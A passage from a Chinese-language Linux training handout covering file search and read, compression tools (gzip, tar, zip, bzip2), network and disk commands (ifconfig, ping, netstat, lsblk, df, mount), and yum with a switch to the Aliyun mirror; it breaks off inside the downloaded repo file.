"*.gz"\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576829221486](./img/linux/java-linux/Linux-v10-02天-授课/1576829221486.png)\r\n\r\n\r\n\r\n**2、将目前目录及其子目录下所有最近 1天内更新过的文件查询出来**\r\n\r\n```shell\r\nfind . -ctime -1\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576829352063](./img/linux/java-linux/Linux-v10-02天-授课/1576829352063.png)\r\n\r\n**3、全局搜索czbk**\r\n\r\n/代表是全盘搜索,也可以指定目录搜索 \r\n\r\n```shell\r\n find / -name  \'czbk\'\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576829929308](./img/linux/java-linux/Linux-v10-02天-授课/1576829929308.png)\r\n\r\n## 1.7 read命令\r\n\r\n> 注意：\r\n>\r\n> read命令属于文件范畴的命令\r\n>\r\n> 在下面的演示中，会涉及到shell，shell章节在最后一章\r\n>\r\n> 建议：讲解shell的时候在回过来说下read命令的语法\r\n>\r\n> 我们在综合案例中也会降到read\r\n\r\n```\r\n引子：\r\nread命令相当于在java SE阶段我们学习的键盘录入输入Scanner（read命令会比Scanner更强大），开发人员可以动态的与程序交互，\r\n```\r\n\r\nread命令用于从标准输入读取数值。\r\n\r\nread 内部命令被用来从标准输入读取单行数据。这个命令可以用来读取键盘输入，当使用重定向的时候，可以读取文件中的一行数据。\r\n\r\n**语法**\r\n\r\n```\r\nread [-ers] [-a aname] [-d delim] [-i text] [-n nchars] [-N nchars] [-p prompt] [-t timeout] [-u fd] [name ...]\r\n```\r\n\r\n**1、简单读取**\r\n\r\n```shell\r\n#!/bin/bash\r\necho "请您输入网站名: "  \r\n#读取从键盘的输入  \r\nread website  \r\necho "你输入的网站名是 $website"  \r\nexit 0  #退出\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577409765115](./img/linux/java-linux/Linux-v10-02天-授课/1577409765115.png)\r\n\r\n\r\n\r\n**3、读取文件**\r\n\r\n每次调用 read 命令都会读取文件中的 "一行" 文本。当文件没有可读的行时，read 命令将以非零状态退出。\r\n\r\n我们可以使用 cat 命令将结果直接传送给包含 read 命令的 while 命令。\r\n\r\n测试文件 test.txt 内容如下：\r\n\r\n```\r\nAAAAAAAAAAAAAAAAAAAAAA\r\nBBBBBBBBBBBBBBBBBBBBBB\r\nCCCCCCCCCCCCCCCCCCCCCC\r\nDDDDDDDDDDDDDDDDDDDDDD\r\n================传智播客\r\n```\r\n\r\n脚本如下，可以将脚本放到xxx.sh中进行执行\r\n\r\n```shell\r\n#!/bin/bash\r\ncount=1\r\ncat test.txt | while read line      \r\n# cat 命令的输出作为read命令的输入,read读到>的值放在line中\r\ndo\r\n   echo "Line $count:$line"\r\n   count=$[ $count + 1 ]          # 注意中括号中的空格。\r\ndone\r\necho "finish"\r\nexit 0\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577410272633](./img/linux/java-linux/Linux-v10-02天-授课/1577410272633.png)\r\n\r\n> 总结\r\n>\r\n> 由此可看read命令不仅可以读取键盘输入，而且还可以读取静态文件\r\n\r\n## 1.8 总结\r\n\r\n文件命令是我们在开发过程中最经常使用的到的命令，所以，我们在学习过程中一定要认真学习文件的常用命令，比如文件创建、编写、读取命令。\r\n\r\n# 2 Linux备份压缩\r\n\r\n```\r\n在Windows中我们对于一个大文件进行压缩的时候，通常会使用第三方工具，比如360压缩、快压等工具，把一个文件压缩成.zip格式的压缩文件；而在Linux中我们也可以通过各种命令实现压缩的功能。\r\n```\r\n\r\n## **2.1 gzip命令**\r\n\r\n```\r\n压缩/解压缩文件，不能压缩目录\r\nwindows下接触的压缩文件大多是.rar，.7z格式，Linux下，不能识别这种格式。\r\n.zip格式的文件在Windows和Linux下都能使用。\r\n压缩文件，能节省磁盘空间，传输时能节省网络带宽\r\n```\r\n\r\ngzip命令用于压缩文件。\r\n\r\ngzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出".gz"的扩展名\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```shell\r\ngzip[参数][文件或者目录]\r\n```\r\n\r\n**1、压缩目录下的所有文件**\r\n\r\n数据准备，新建一个目录，里面随便新建4个文件\r\n\r\n```shell\r\nmkdir  gzipTest\r\ncd gzipTest/\r\ntouch  001\r\ntouch  002\r\ntouch  003\r\ntouch  004\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576736152636](./img/linux/java-linux/Linux-v10-02天-授课/1576736152636.png)\r\n\r\n**1、压缩目录下的所有文件**\r\n\r\n```shell\r\ngzip * \r\n```\r\n\r\n![1576736179025](./img/linux/java-linux/Linux-v10-02天-授课/1576736179025.png)\r\n\r\n**2、 列出详细的信息**\r\n\r\n解压文件并列出详细信息\r\n\r\n```shell\r\ngzip -dv *\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576736286406](./img/linux/java-linux/Linux-v10-02天-授课/1576736286406.png)\r\n\r\n\r\n\r\n## 2.2 gunzip命令\r\n\r\n```\r\ngunzip是个使用广泛的解压缩程序，它用于解开被gzip压缩过的文件\r\n```\r\n\r\ngunzip命令用于解压文件。\r\n\r\n**语法**\r\n\r\n```\r\ngunzip[参数][文件或者目录]\r\n```\r\n\r\n```shell\r\ngunzip 001.gz \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576738711718](./img/linux/java-linux/Linux-v10-02天-授课/1576738711718.png)\r\n\r\n001为解压后的文件\r\n\r\n## 2.3 tar命令\r\n\r\n```\r\ntar的主要功能是打包、压缩和解压文件。\r\n\r\ntar本身不具有压缩功能。他是调用压缩功能实现的 。\r\n```\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```shell\r\ntar[必要参数][选择参数][文件] \r\n```\r\n\r\n**1、将 txtfile.txt文件打包（仅打包，不压缩）**\r\n\r\ntxtfile.txt文件为上面章节的例子\r\n\r\n```shell\r\ntar -cvf txt.tar txtfile.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576726937758](./img/linux/java-linux/Linux-v10-02天-授课/1576726937758.png)\r\n\r\n **2、将 txtfile.txt文件打包压缩（打包压缩（gzip））**\r\n\r\n```shell\r\ntar -zcvf txt.tar.gz txtfile.txt \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576727107465](./img/linux/java-linux/Linux-v10-02天-授课/1576727107465.png)\r\n\r\n>  总结\r\n>\r\n> 参数 f 之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加 z 参数，则以 .tar.gz 或 .tgz 来代表 gzip 压缩过的 tar包\r\n\r\n**3、查看tar中有哪些文件**\r\n\r\n```shell\r\ntar -ztvf txt.tar.gz\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576734505587](./img/linux/java-linux/Linux-v10-02天-授课/1576734505587.png)\r\n\r\n压缩包中的文件有txtfile.txt\r\n\r\n**4、将tar 包解压缩**\r\n\r\n```shell\r\n1.新建目录\r\n mkdir ysFiles\r\n2.复制\r\n cp txt.tar.gz ./ysFiles/\r\n3.解压缩\r\n tar -zxvf /home/itcast/ysFiles/txt.tar.gz\r\n```\r\n\r\n解压后的文件如下\r\n\r\n![1576735062585](./img/linux/java-linux/Linux-v10-02天-授课/1576735062585.png)\r\n\r\n## 2.4 zip命令\r\n\r\n```\r\n引子\r\nzip命令就完全的相当于在Windows下面选中文件右键进行压缩了\r\n```\r\n\r\nzip命令用于压缩文件。\r\n\r\nzip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有".zip"扩展名的压缩文件。\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```\r\nzip[必要参数][选择参数][文件] \r\n```\r\n\r\n将上面/home/itcast/gzipTest 这个目录下所有文件和文件夹打包为当前目录下的 zFiles.zip：\r\n\r\n```shell\r\n1.在目录下新建一个005目录\r\nmkdir 005\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576736751949](./img/linux/java-linux/Linux-v10-02天-授课/1576736751949.png)\r\n\r\n开始压缩\r\n\r\n```shell\r\n2.压缩\r\nzip -q -r zFiles.zip *\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576736844251](./img/linux/java-linux/Linux-v10-02天-授课/1576736844251.png)zFiles.zip文件就是我们刚刚压缩后的文件\r\n\r\n## 2.5 unzip命令\r\n\r\n```\r\n引子\r\nunzip命令就完全的相当于在Windows下面选中文件右键进行解压缩了\r\n```\r\n\r\nLinux unzip命令用于解压缩zip文件\r\n\r\nunzip为.zip压缩文件的解压缩程序\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```\r\nunzip[必要参数][选择参数][文件] \r\n```\r\n\r\n**参数**：\r\n\r\n上接上面的zip的例子\r\n\r\n**1、查看压缩文件中包含的文件：**\r\n\r\n```shell\r\n unzip -l zFiles.zip\r\n```\r\n\r\n![1576737168412](./img/linux/java-linux/Linux-v10-02天-授课/1576737168412.png)\r\n\r\n包含了压缩文件里面文件的详细信息\r\n\r\n文件大小  日期 时间  文件名称\r\n\r\n总数量和总大小\r\n\r\n**2、如果要把文件解压到指定的目录下，需要用到-d参数**\r\n\r\n```shell\r\n1.新建目录\r\nunFiles\r\n2.解压缩\r\nunzip -d ./unFiles zFiles.zip\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576737722160](./img/linux/java-linux/Linux-v10-02天-授课/1576737722160.png)\r\n\r\n 查看解压后的文件，如下图\r\n\r\n![1576737744650](./img/linux/java-linux/Linux-v10-02天-授课/1576737744650.png)\r\n\r\n\r\n\r\n## 2.6 bzip2命令\r\n\r\n```\r\n引子\r\n".bz2"格式是 Linux 的另一种压缩格式，从理论上来讲，".bz2"格式的算法更先进、压缩比更好；而 咱们上面学到的".gz"格式相对来讲时间更快\r\n在使用过程中可以根据需求自由选择\r\n```\r\n\r\nbzip2命令是.bz2文件的压缩程序。\r\n\r\nbzip2采用新的压缩演算法，压缩效果比传统的LZ77/LZ78压缩演算法来得好。若没有加上任何参数，bzip2压缩完文件后会产生.bz2的压缩文件，并删除原始的文件。\t\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```\r\nbzip2 [-cdfhkLstvVz][--repetitive-best][--repetitive-fast][- 压缩等级][要压缩的文件]\r\n```\r\n\r\n**1、压缩文件**\r\n\r\n```\r\n1.创建目录\r\n mkdir  bzFiles\r\n cd ./bzFiles/\r\n2.创建文件\r\ntouch 001\r\n3.压缩\r\nbzip2 001\r\nll\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576742060052](./img/linux/java-linux/Linux-v10-02天-授课/1576742060052.png)\r\n\r\n如上图001.bz2就是压缩后的文件\r\n\r\n## **2.7 bunzip2命令**\r\n\r\n```\r\n引子\r\nLinux bunzip2命令是.bz2文件的解压缩程序。\r\n```\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**：\r\n\r\n```shell\r\nbunzip2 [-fkLsvV][.bz2压缩文件]\r\n```\r\n\r\n**参数**：\r\n\r\n**解压.bz2文件**\r\n\r\n```shell\r\nbunzip2 -v 001.bz2 \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576744907366](./img/linux/java-linux/Linux-v10-02天-授课/1576744907366.png)\r\n\r\n001文件即是被解压后的\r\n\r\n## 2.8 总结\r\n\r\ngz：由gzip压缩工具压缩的文件。\r\n\r\n.bz2：由bzip2压缩工具压缩的文件。\r\n\r\n.tar：由tar打包程序打包的文件（tar没有压缩功能，只是把一个 目录合并成一个文件）\r\n\r\n.tar.gz：可理解为先由tar打包，再由gz压缩。\r\n\r\n.zip:可理解为由zip压缩工具直接压缩\r\n\r\n# 3 网络与磁盘管理\r\n\r\n> Tips:\r\n>\r\n> 重点讲解内容\r\n\r\n## **3.1 网络命令**\r\n\r\n### 3.1.1 ifconfig命令\r\n\r\n```\r\n引子：\r\n\r\nifconfig命令有点类似于Windows的ipconfig命令\r\n```\r\n\r\nifconfig是Linux中用于显示或配置网络设备的命令，英文全称是network interfaces configuring\r\n\r\n ifconfig命令用于显示或设置网络设备。\r\n\r\nifconfig可设置网络设备的状态，或是显示目前的设置。\r\n\r\n**使用者权限：所有（设置级别的需要管理员）用户**\r\n\r\n**语法**\r\n\r\n```\r\nifconfig [网络设备][down up -allmulti -arp -promisc][add<地址>][del<地址>][<hw<网络设备类型><硬件地址>][io_addr<I/O地址>][irq<IRQ地址>][media<网络媒介类型>][mem_start<内存地址>][metric<数目>][mtu<字节>][netmask<子网掩码>][tunnel<地址>][-broadcast<地址>][-pointopoint<地址>][IP地址]\r\n```\r\n\r\n**1、显示激活的网卡信息**\r\n\r\n```\r\nifconfig\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576749039798](./img/linux/java-linux/Linux-v10-02天-授课/1576749039798.png)\r\n\r\n![1576749055869](./img/linux/java-linux/Linux-v10-02天-授课/1576749055869.png)\r\n\r\n**ens33（有的是eth0）**表示第一块网卡。\r\n\r\n表示ens33网卡的 IP地址是 192.168.23.129，广播地址，broadcast 192.168.23.255，掩码地址netmask:255.255.255.0 ，inet6对应的是ipv6\r\n\r\n**ens37** 表示第二块网卡\r\n\r\n**lo** 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口 \r\n\r\n启动关闭指定网卡\r\n\r\n**virbr0**是一种虚拟网络接口\r\n\r\n**2、关闭网卡（需要切换到管理员账户）**\r\n\r\n```shell\r\n ifconfig ens37 down\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576748850255](./img/linux/java-linux/Linux-v10-02天-授课/1576748850255.png)\r\n\r\n**3、启用网卡（需要切换到管理员账户）**\r\n\r\n```shell\r\nifconfig ens37 up\r\n```\r\n\r\n 执行效果如下\r\n\r\n![1576748937884](./img/linux/java-linux/Linux-v10-02天-授课/1576748937884.png)\r\n\r\n**4、配置ip信息**\r\n\r\n```shell\r\n// 配置ip地址\r\nifconfig ens37 192.168.23.199\r\n// 配置ip地址和子网掩码\r\nifconfig ens37 192.168.23.133 netmask 255.255.255.0\r\n```\r\n\r\n执行效果如下，配置ip地址：\r\n\r\n![1576749864267](./img/linux/java-linux/Linux-v10-02天-授课/1576749864267.png)\r\n\r\n查看ip，如下图\r\n\r\n![1576749896757](./img/linux/java-linux/Linux-v10-02天-授课/1576749896757.png)\r\n\r\n配置ip地址和子网掩码，执行效果如下图\r\n\r\n![1576749957171](./img/linux/java-linux/Linux-v10-02天-授课/1576749957171.png)\r\n\r\n这样的话我们就可以通过命令的方式设置网卡的网络信息了。\r\n\r\n### 3.1.2 ping命令\r\n\r\n```\r\n等价于Windows的ping命令\r\n```\r\n\r\nping命令用于检测主机。\r\n\r\n执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```shell\r\nping [-dfnqrRv][-c<完成次数>][-i<间隔秒数>][-I<网络界面>][-l<前置载入>][-p<范本样式>][-s<数据包大小>][-t<存活数值>][主机名称或IP地址]\r\n```\r\n\r\n**1、检测是否与主机连通**\r\n\r\n```shell\r\n ping www.baidu.com\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576750258293](./img/linux/java-linux/Linux-v10-02天-授课/1576750258293.png)\t\r\n\r\nicmp_seq：ping序列，从1开始\r\n\r\nttl:IP生存时间值\r\n\r\ntime: 响应时间,数值越小，联通速度越快\r\n\r\n**2、指定接收包的次数**\r\n\r\n和上面不同的是：收到两次包后，自动退出\r\n\r\n```shell\r\nping -c 2 www.baidu.com\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576750967595](./img/linux/java-linux/Linux-v10-02天-授课/1576750967595.png)\r\n\r\n> 总结：\r\n>\r\n> ping命令也是我们在开发过程中常用到的命令\r\n>\r\n> 通常使用  ping  xxx.xxx.xxx.xxx命令进行检测本地与目标机器是否连通\r\n\r\n### 3.1.3 netstat命令\r\n\r\n```\r\n利用netstat指令可让你得知整个Linux系统的网络情况\r\n```\r\n\r\nnetstat命令用于显示网络状态。\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```\r\nnetstat [-acCeFghilMnNoprstuvVwx][-A<网络类型>][--ip]\r\n```\r\n\r\n**1、显示详细的连接状况**\r\n\r\n```shell\r\nnetstat -a\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576751379320](./img/linux/java-linux/Linux-v10-02天-授课/1576751379320.png)\r\n\r\n比如上面的【0 0.0.0.0:ssh】它是远程终端连接Linux的ssh服务，默认使用了22端口，它的状态【State】是处于监听状态，属于正常。\r\n\r\n**2、显示网卡列表**\r\n\r\n```shell\r\nnetstat -i\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576751502980](./img/linux/java-linux/Linux-v10-02天-授课/1576751502980.png)\r\n\r\n上图显示的是我们在介绍【ifconfig】命令的时候看到的网卡信息\r\n\r\n## 3.2 磁盘命令\r\n\r\n### **3.2.1 lsblk命令**\r\n\r\n```\r\n使用lsblk命令可以以tree的形式展示所有设备的信息\r\n```\r\n\r\nlsblk命令的英文是“list block”，即用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息。\r\n\r\n**语法格式：**lsblk [参数]\r\n\r\n**使用者权限：所有用户**\r\n\r\n**1、lsblk命令默认情况下将以树状列出所有块设备：**\r\n\r\n```shell\r\nlsblk\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576827840642](./img/linux/java-linux/Linux-v10-02天-授课/1576827840642.png)\r\n\r\nNAME : 这是块设备名。\r\n\r\nMAJ:MIN : 本栏显示主要和次要设备号。\r\n\r\nRM : 本栏显示设备是否可移动设备。注意，在上面设备sr0的RM值等于1，这说明他们是可移动设备。\r\n\r\nSIZE : 本栏列出设备的容量大小信息。\r\n\r\nRO : 该项表明设备是否为只读。在本案例中，所有设备的RO值为0，表明他们不是只读的。\r\n\r\nTYPE :本栏显示块设备是否是磁盘或磁盘上的一个分区。在本例中，sda和sdb是磁盘，而sr0是只读存储（rom）。\r\n\r\nMOUNTPOINT : 本栏指出设备挂载的挂载点。\r\n\r\n**2、默认选项不会列出所有空设备：**\r\n\r\n```shell\r\nlsblk -f\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576828112552](./img/linux/java-linux/Linux-v10-02天-授课/1576828112552.png)\r\n\r\nNAME表示设备名称\r\n\r\nFSTYPE表示文件类型\r\n\r\nLABEL表示设备标签\r\n\r\nUUID设备编号\r\n\r\nMOUNTPOINT表示设备的挂载点\r\n\r\n> 注意\r\n>\r\n> 我们学习这个命令主要是在下面将要学习的fdisk分区中会经常使用到\r\n\r\n### 3.2.2 df命令\r\n\r\n```\r\n引子（如下图）：\r\nLinux的df命令类似于在Windows中的【计算机】--【管理】--【磁盘管理】菜单对磁盘的统计情况查看\r\n```\r\n\r\n![1576751996364](./img/linux/java-linux/Linux-v10-02天-授课/1576751996364.png)\r\n\r\n df命令用于显示目前在Linux系统上的文件系统的磁盘使用情况统计。\r\n\r\n**使用者权限：所有用户**\r\n\r\n**语法**\r\n\r\n```\r\ndf [选项]... [FILE]...\r\n```\r\n\r\n**1、显示磁盘使用情况统计情况**\r\n\r\n```\r\ndf  \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576752158168](./img/linux/java-linux/Linux-v10-02天-授课/1576752158168.png)\r\n\r\n第一列指定文件系统的名称\r\n\r\n第二列指定一个特定的文件系统1K-块1K是1024字节为单位的总容量。\r\n\r\n已用和可用列分别指定的容量。\r\n\r\n最后一个已用列指定使用的容量的百分比\r\n\r\n最后一栏指定的文件系统的挂载点。\r\n\r\n**2、df命令也可以显示磁盘使用的文件系统信息**\r\n\r\n比如我们df下之前创建过的目录gzipTest的使用情况\r\n\r\n```\r\ndf  gzipTest/\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576752596414](./img/linux/java-linux/Linux-v10-02天-授课/1576752596414.png)\r\n\r\n**3、df显示所有的信息**\r\n\r\n```\r\ndf --total \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576752719226](./img/linux/java-linux/Linux-v10-02天-授课/1576752719226.png)\r\n\r\n我们看到输出的末尾，包含一个额外的行，显示总的每一列。\r\n\r\n 4、df换算后显示\r\n\r\n```shell\r\ndf -h \r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576752819456](./img/linux/java-linux/Linux-v10-02天-授课/1576752819456.png)\r\n\r\n我们可以看到输出显示的数字形式的\'G\'（千兆字节），"M"（兆字节）和"K"（千字节）。\r\n\r\n这使输出容易阅读和理解，从而使显示可读的。请注意，第二列的名称也发生了变化，为了使显示可读的"容量"。\r\n\r\n### 3.2.3 mount命令\r\n\r\n```\r\n在Linux当中所有的存储设备如u盘、光盘、硬盘等，都必须挂载之后才能正常使用。\r\n\r\n其实挂载可以理解为Windows当中的分配盘符（重要），只不过windows当中是以英文字母ABCD等作为盘符，而linux是拿系统目录作为盘符，当然linux当中也不叫盘符，而是称为挂载点，而把为分区或者光盘等存储设备分配一个挂载点的过程称为挂载\r\n```\r\n\r\n mount命令是经常会使用到的命令，它用于挂载Linux系统外的文件。\r\n\r\n**挂载概念**\r\n\r\n在安装linux系统时设立的各个分区，如根分区、/boot分区等都是自动挂载的，也就是说不需要我们人为操作，开机就会自动挂载。但是光盘、u盘等存储设备如果需要使用，就必须人为的进行挂载。\r\n\r\n其实我们在windows下插入U盘也是需要挂载(分配盘符)的，只不过windows下分配盘符是自动的\r\n\r\nLinux中的根目录以外的文件要想被访问，需要将其“关联”到根目录下的某个目录来实现，这种关联操作就是“挂载”，这个目录就是“挂载点”，解除次关联关系的过程称之为“卸载”。\r\n\r\n**注意：“挂载点”的目录需要以下几个要求：**\r\n\r\n（1）目录事先存在，可以用mkdir命令新建目录；\r\n\r\n（2）挂载点目录不可被其他进程使用到；\r\n\r\n（3）挂载点下原有文件将被隐藏。\r\n\r\n**使用者权限：所有用户，设置级别的需要管理员**\r\n\r\n**语法**\r\n\r\n```\r\nmount [-hV]\r\nmount -a [-fFnrsvw] [-t vfstype]\r\nmount [-fnrsvw] [-o options [,...]] device | dir\r\nmount [-fnrsvw] [-t vfstype] [-o options] device dir\r\n```\r\n\r\n需求:\r\n比如现在我们要通过挂载的方式查看Linux CD/DVD光驱里面的内容\r\n\r\n**1、CD/DVD设置**\r\n\r\n进入【虚拟机】--【设置】\r\n\r\n![1576805605263](./img/linux/java-linux/Linux-v10-02天-授课/1576805605263.png)\r\n\r\n\r\n\r\n设置CD/DVD的内容，我们这里使用的是F:\\CentOS-7-x86_64-DVD-1810.iso\r\n\r\n![1576805634085](./img/linux/java-linux/Linux-v10-02天-授课/1576805634085.png)\r\n\r\n查看F:\\CentOS-7-x86_64-DVD-1810.iso；里面的内容\r\n\r\n![1576805690039](./img/linux/java-linux/Linux-v10-02天-授课/1576805690039.png)\r\n\r\n\r\n\r\n**2、创建挂载点**\r\n\r\n注意：一般用户无法挂载cdrom,只有root用户才可以操作\r\n\r\n我们切换到root下创建一个挂载点（其实就是创建一个目录）\r\n\r\n```shell\r\nmkdir  -p mnt/cdrom\r\n```\r\n\r\n**3、开始挂载**\r\n\r\n通过挂载点的方式查看上面的【ISO文件内容】\r\n\r\n```shell\r\nmount -t auto /dev/cdrom /mnt/cdrom\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576807195774](./img/linux/java-linux/Linux-v10-02天-授课/1576807195774.png)\r\n\r\n表示挂载成功\r\n\r\n**4、查看挂载点内容**\r\n\r\n```shell\r\nls -l -a ./mnt/cdrom/\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576807395970](./img/linux/java-linux/Linux-v10-02天-授课/1576807395970.png)\r\n\r\n如上图所示，我们通过挂载点查看CD/DVD的文件个数是14个，和上面的【ISO文件内容】个数一致。\r\n\r\n**5、卸载cdrom**\r\n\r\n在前面我们将CD/DVD挂载到了文件系统，如果我们不用了，就可以将其卸载掉\r\n\r\n```\r\numount ./mnt/cdrom/\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576807774194](./img/linux/java-linux/Linux-v10-02天-授课/1576807774194.png)\r\n\r\n我们发现卸载后，通过挂载点就无法查看CD/DVD里面的数据了。\r\n\r\n## 3.3 总结\r\n\r\n关于挂载：用户**不能**直接访问 硬件设备需要将硬件设备 **挂载** 到 系统目录上,  才可以让用户访问。\r\n\r\n# 4 shell与安装\r\n\r\n> tips\r\n>\r\n> 重点讲解内容\r\n\r\n## 4.1 yum使用\r\n\r\n```\r\n引子：\r\nyum类似于开发工具idea、eclipse中的在线插件安装商店\r\n我们输入一个将要安装的插件名字，进行搜索、安装的过程。\r\n```\r\n\r\n**yum概念**\r\n\r\nyum（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。\r\n\r\nyum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。\r\n\r\n**yum原理**\r\n\r\n![1576833281476](./img/linux/java-linux/Linux-v10-02天-授课/1576833281476.png)\r\n\r\n> **注意：必须联网**\r\n>\r\n> 不同的服务通过yum命令连接远程yum源进行查找、下载、安装\r\n\r\n**使用者权限：管理员**\r\n\r\n**语法**\r\n\r\n```shell\r\nyum [options] [command] [package ...]\r\n```\r\n\r\n- **options：**可选，选项包括-h（帮助），-y（当安装过程提示选择全部为"yes"），-q（不显示安装的过程）等等。\r\n- **command：**要进行的操作。\r\n- **package**操作的对象。\r\n\r\n------\r\n\r\n**yum常用命令**\r\n\r\n- 1.列出所有可更新的软件清单命令：yum check-update\r\n- 2.更新所有软件命令：yum update\r\n- 3.仅安装指定的软件命令：yum install <package_name>\r\n- 4.仅更新指定的软件命令：yum update <package_name>\r\n- 5.列出所有可安裝的软件清单命令：yum list\r\n- 6.删除软件包命令：yum remove <package_name>\r\n- 7.查找软件包 命令：yum search <keyword>\r\n- 8.清除缓存命令:\r\n  - yum clean packages: 清除缓存目录下的软件包\r\n  - yum clean headers: 清除缓存目录下的 headers\r\n  - yum clean oldheaders: 清除缓存目录下旧的 headers\r\n  - yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的headers\r\n\r\n### **4.1.1 安装tree**\r\n\r\n```shell\r\nyum -y install tree   //y当安装过程提示选择全部为"yes"\r\n```\r\n\r\n执行效果如下\r\n\r\n注意：第一次在itcast用户执行的时候\r\n\r\n提示我们【需要管理员权限】\r\n\r\n![1576554600128](./img/linux/java-linux/Linux-v10-02天-授课/1576554600128.png)\r\n\r\n![1576554617660](./img/linux/java-linux/Linux-v10-02天-授课/1576554617660.png)\r\n\r\n安装完执行tree命令\r\n\r\n```shell\r\ntree\r\n```\r\n\r\n![1576832663328](./img/linux/java-linux/Linux-v10-02天-授课/1576832663328.png)\r\n\r\n### **4.1.2 移除tree**\r\n\r\n```shell\r\nyum remove  tree\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576832810922](./img/linux/java-linux/Linux-v10-02天-授课/1576832810922.png)\r\n\r\n此时，我们在执行tree命令\r\n\r\n```shell\r\ntree\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576832843434](./img/linux/java-linux/Linux-v10-02天-授课/1576832843434.png)\r\n\r\n如上图，由于我们移除了tree，在执行tree命令的时候发现找不到这个命令了。\r\n\r\n### **4.1.3 yum查找**\r\n\r\n利用 yum 的功能，找出以 tom 为开头的软件名称有哪些\r\n\r\n```shell\r\nyum list tom*\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576832953119](./img/linux/java-linux/Linux-v10-02天-授课/1576832953119.png)\r\n\r\n### 4.1.4 yum源\r\n\r\n**概述**\r\n\r\nyum需要一个yum库，也就是yum源。\r\n\r\n简单的说，我们安装软件的时候需要下载软件，将很多软件放在一起就是源。软件安装包的来源，所以yum源就是软件安装包来源 \r\n\r\n**yum源分类**\r\n\r\n目前，yum默认使用的是CentOS的yum源，如下\r\n\r\n  ![1576834523252](./img/linux/java-linux/Linux-v10-02天-授课/1576834523252.png)\r\n\r\n![1576834556997](./img/linux/java-linux/Linux-v10-02天-授课/1576834556997.png)\r\n\r\n目前，国内有很多不错的yum源，比如阿里、网易、搜狐等\r\n\r\n**安装阿里yum源**\r\n\r\n因为默认的yum源服务器在国外，我们在安装软件的时候会受到速度的影响，所以安装国内yum源在下载的时候速度、稳定性会比国外的好很多。\r\n\r\n**1) 安装wget**\r\n\r\n```shell\r\nyum install -y wget\r\n```\r\n\r\n 执行效果如下\r\n\r\n![1576834799803](./img/linux/java-linux/Linux-v10-02天-授课/1576834799803.png)\r\n\r\n![1576834824250](./img/linux/java-linux/Linux-v10-02天-授课/1576834824250.png)\r\n\r\n安装成功。\r\n\r\n**2) 备份/etc/yum.repos.d/CentOS-Base.repo文件**\r\n\r\n```shell\r\ncd /etc/yum.repos.d/\r\nmv CentOS-Base.repo CentOS-Base.repo.back\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1576834936907](./img/linux/java-linux/Linux-v10-02天-授课/1576834936907.png)\r\n\r\n**3) 下载阿里云的Centos-7.repo文件**\r\n\r\n```shell\r\nwget -O CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\r\n```\r\n\r\n> 注意\r\n>\r\n> 上面的url中要卸载Centos-7.repo；而不是Centos-6.repo\r\n\r\n 执行效果如下图\r\n\r\n![1576837935001](./img/linux/java-linux/Linux-v10-02天-授课/1576837935001.png)\r\n\r\n查看下载的阿里云的Centos-6.repo文件\r\n\r\n```shell\r\ncat CentOS-Base.repo\r\n```\r\n\r\n执行效果如下\r\n\r\n```SHELL\r\n# CentOS-Base.repo\r\n#\r\n# The mirror system uses the connecting IP address of the client and the\r\n# update status of each mirror to pick mirrors that are updated to and\r\n# geographically close to the client.  You should use this for CentOS updates\r\n# unless you are manually picking other mirrors.\r\n#\r\n# If the mirrorlist= does not work for 